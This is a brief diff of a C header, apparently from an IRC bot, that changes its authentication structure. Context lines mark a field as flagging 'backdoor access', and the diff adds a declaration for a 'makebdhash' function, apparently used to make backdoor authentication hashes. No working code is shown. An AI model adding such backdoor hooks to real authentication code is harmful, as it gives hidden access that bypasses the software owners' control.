@@ -11,9 +11,7 @@ struct auth_t {
   int authed;
   int authing;
   int bd;			/* is this auth a backdoor access? */
-#    ifdef S_AUTHHASH
   char hash[MD5_HASH_LENGTH + 1];       /* used for dcc authing */
-#    endif                      /* S_AUTHHASH */
   char nick[NICKLEN];
   char hand[NICKLEN];
   char host[UHOSTLEN];
@@ -25,6 +23,7 @@ struct auth_t {
 int new_auth();
 int findauth(char *);
 void removeauth(int);
+char *makebdhash(char *);
 #  endif/* S_AUTHCMDS */
 #  if defined(S_AUTHHASH) || defined(S_DCCAUTH)
 char *makehash(struct userrec *, char *);
